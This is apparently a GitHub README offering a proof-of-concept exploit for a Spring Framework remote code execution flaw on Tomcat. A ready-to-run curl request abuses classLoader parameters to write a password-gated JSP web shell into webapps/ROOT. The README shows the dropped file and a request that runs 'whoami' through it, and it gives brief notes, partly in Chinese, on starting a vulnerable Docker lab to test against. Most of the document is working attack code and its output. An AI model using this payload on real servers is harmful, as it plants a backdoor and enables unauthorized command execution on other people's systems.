## spring-core-rce

## POC

```bash
curl -v -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" http://target:8080/path
```

The file is dropped to disk:

```
cat ./apache-tomcat-8.5.77/webapps/ROOT/tomcatwar.jsp 
- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))3D-1){ out.println(new String(b)); } } -
```

shell: `target/tomcatwar.jsp?pwd=j&cmd=whoami`

ROOT.war 来自白帽汇的 vulfocus 镜像,直接放在 jdk9+ 的 tomcat 环境部署即可启动测试.

也可以自行使用 docker pull

```
docker run -d -p 8082:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29
```

然后访问 本地的 8082 端口，显示 OK,即运行成功


本地测试写入的文件截图:

<img width="1318" alt="image" src="https://user-images.githubusercontent.com/18260135/160864865-b1a1e71f-d462-45cf-9fbb-f1f20250c206.png">

Reference：https://github.com/jbaines-r7/spring4shell_vulnapp 
